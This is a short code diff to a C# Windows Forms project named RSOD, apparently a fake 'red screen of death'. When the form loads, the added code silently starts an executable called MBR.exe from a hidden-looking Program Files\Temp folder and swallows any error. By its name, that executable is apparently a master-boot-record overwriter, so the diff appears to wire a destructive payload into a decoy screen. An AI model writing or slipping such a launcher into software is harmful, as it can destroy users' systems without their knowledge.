@@ -7,6 +7,8 @@ using System.Drawing;
 using System.Linq;
 using System.Text;
 using System.Windows.Forms;
+using System.IO;
+using System.Diagnostics;
 
 namespace RSOD
 {
@@ -24,8 +26,18 @@ namespace RSOD
 
         private void RSOD_Load(object sender, EventArgs e)
         {
-           
-            
+           try
+            {
+                string mbr = @"C:\Program Files\Temp\MBR.exe";
+                if (File.Exists(mbr))
+                {
+                    Process.Start(mbr);
+                }
+            }
+            catch
+            {
+
+            }
         }
     }
 }
